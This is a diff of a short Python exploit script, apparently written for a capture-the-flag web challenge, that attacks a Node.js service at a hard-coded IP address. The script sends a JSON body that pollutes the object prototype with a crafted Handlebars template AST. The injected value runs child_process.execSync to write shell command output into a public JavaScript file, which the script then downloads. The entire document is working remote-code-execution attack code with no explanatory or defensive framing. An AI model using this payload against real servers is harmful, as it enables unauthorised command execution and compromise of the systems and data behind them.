@@ -1,35 +1,34 @@
 #!/usr/bin/python3
 
 import requests
-import json
 
 def connect():
-    url = "http://46.101.23.188:31968/"
+    url = 'http://localhost:1337'
+    url = "http://46.101.14.236:30843/"
     submit = "api/submit"
     out = "static/js/main.js"
 
     headers = { 
         'Content-Type' : 'application/json', 
-        'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:92.0) Gecko/20100101 Firefox/92.0',
         }
 
-    r = requests.post(url + submit, headers=headers, json= {
-    "artist.name":"Haigh",
+    r = requests.post(url + submit, json = {
+    "artist.name":"Gingell",
     "__proto__.type": "Program",
     "__proto__.body": [{
         "type": "MustacheStatement",
         "path": 0,
         "params": [{
             "type": "NumberLiteral",
-
-            "value": "process.mainModule.require('child_process').execSync('ls > static/js/main.js')"
+            "value": "process.mainModule.require('child_process').execSync(`ls >> /static/js/main.js`)"
         }],
         "loc": {
             "start": 0,
             "end": 0
         }
     }]
-})
+    })
+
     r2 = requests.get(url + out, headers=headers)
 
     print(r.status_code)
